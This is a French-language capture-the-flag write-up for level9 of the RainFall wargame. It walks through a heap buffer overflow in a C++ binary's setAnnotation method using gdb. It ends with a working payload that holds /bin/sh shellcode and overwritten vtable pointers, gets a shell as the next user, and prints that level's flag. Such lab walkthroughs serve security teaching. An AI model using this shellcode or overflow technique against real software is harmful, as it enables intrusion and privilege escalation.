# level 9
Voici une explication détaillée de chacune des parties du programme C++:

## Fonction main
La fonction principale du programme commence par vérifier si au moins un argument a été passé en ligne de commande (en excluant le nom du programme lui-même). Si ce n'est pas le cas, elle appelle _exit(1).

## Allocation et Initialisation des Objets N
Deux objets de type N sont créés et initialisés :

- Premier objet initialisé avec une valeur de 5.
- Deuxième objet initialisé avec une valeur de 6.

Après leur création, la fonction setAnnotation est appelée sur le premier objet this en passant le premier argument de ligne de commande (argv[1]).

Cette méthode copie une chaîne de caractères dans l'objet, en commençant juste après le début de l'objet (à l'adresse this + 4). La longueur de la chaîne est déterminée par strlen, et il n'y a aucune vérification pour prévenir un dépassement de la taille allouée pour l'objet, ce qui représente une vulnérabilité de débordement de tampon.

Ensuite, il y a un appel indirect de fonction via le deuxième objet this_00, qui semble utiliser un pointeur de fonction stocké dans ou avec l'objet.

## Detail de l'exploit

La vulnérabilité ici est l'utilisation non sécurisée de memcpy dans setAnnotation.
Nous allons mettre un breakpoint apres setAnnotation dans gdb et utiliser un script python qui ecris "aaaabbbb....YYYYZZZZ" dans la sortie. Ce qui nous permettra de voir ou nous pourrons ecraser les adresses de retour, et reorienter le code.

```
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax <-------------------------------------------
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
```

```
Starting program: /home/user/level9/level9 $(python /tmp/script.py)

Breakpoint 1, 0x0804867c in main ()
(gdb) i r
eax            0x804a00c        134520844
ecx            0x5a5a5a5a       1515870810
edx            0x804a0dc        134521052
ebx            0x804a078        134520952
esp            0xbffff640       0xbffff640
ebp            0xbffff668       0xbffff668
esi            0x0      0
edi            0x0      0
eip            0x804867c        0x804867c <main+136>
eflags         0x200283 [ CF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r
eax            0x42424242       1111638594
ecx            0x5a5a5a5a       1515870810
```

```
./level9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
level9@RainFall:~$ dmesg | grep segfault
[52806.555838] level9[11797]: segfault at 62626262 ip 08048682 sp bffff650 error 4 in level9[8048000+1000]
```

Le programme segfault a l'adresse 62626262 (bbbb), l'offset est donc de 128.
Nous n'avons plus qu'a trouver l'adresse du buffer, injecter notre shellcode, et sauter au debut du buffer.

Testons dans gdb :
```
(gdb) info functions
0x0804870e  N::setAnnotation(char*)

(gdb) disas 0x0804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax
   0x08048717 <+9>:     mov    %eax,(%esp)
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    0x8(%ebp),%edx
   0x08048722 <+20>:    add    $0x4,%edx
   0x08048725 <+23>:    mov    %eax,0x8(%esp)
   0x08048729 <+27>:    mov    0xc(%ebp),%eax
   0x0804872c <+30>:    mov    %eax,0x4(%esp)
   0x08048730 <+34>:    mov    %edx,(%esp)
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave                      <=== break ici
   0x08048739 <+43>:    ret

   (gdb) run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz

   (gdb) x/100x $eax - 100
    0x8049fa8:      0x00000000      0x00000000      0x00000000      0x00000000
    0x8049fb8:      0x00000000      0x00000000      0x00000000      0x00000000
    0x8049fc8:      0x00000000      0x00000000      0x00000000      0x00000000
    0x8049fd8:      0x00000000      0x00000000      0x00000000      0x00000000
    0x8049fe8:      0x00000000      0x00000000      0x00000000      0x00000000
    0x8049ff8:      0x00000000      0x00000000      0x00000000      0x00000071
    0x804a008:      0x08048848      0x41414141      0x42424242      0x43434343  <=== buffer ici
    0x804a018:      0x44444444      0x45454545      0x46464646      0x47474747
    0x804a028:      0x48484848      0x49494949      0x4a4a4a4a      0x4b4b4b4b
    0x804a038:      0x4c4c4c4c      0x4d4d4d4d      0x4e4e4e4e      0x4f4f4f4f
    0x804a048:      0x50505050      0x51515151      0x52525252      0x53535353
    0x804a058:      0x54545454      0x55555555      0x56565656      0x57575757
    0x804a068:      0x58585858      0x59595959      0x5a5a5a5a      0x61616161
```

```
level9@RainFall:~$ /home/user/level9/level9 $(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * (108 - 30 - 24) + "\x18\xa0\x04\x08")')
Segmentation fault (core dumped)

[54510.788758] level9[11928]: segfault at 90909090 ip 90909090 sp bffff67c error 14
```

Le programme tombe dans le nopsled, mais segfault a nouveau, nous allons a l'adresse du segfault, donner l'adresse du shellcode a nouveau pour resauter une nouvelle fois dedans.

Apres tests et alignements :

```
level9@RainFall:~$ /home/user/level9/level9 $(python -c 'print("\x18\xa0\x04\x08" + "\x90" * 26 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * (108 - 30 - 24) + "\x0c\xa0\x04\x08")')

$ whoami
bonus0

$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

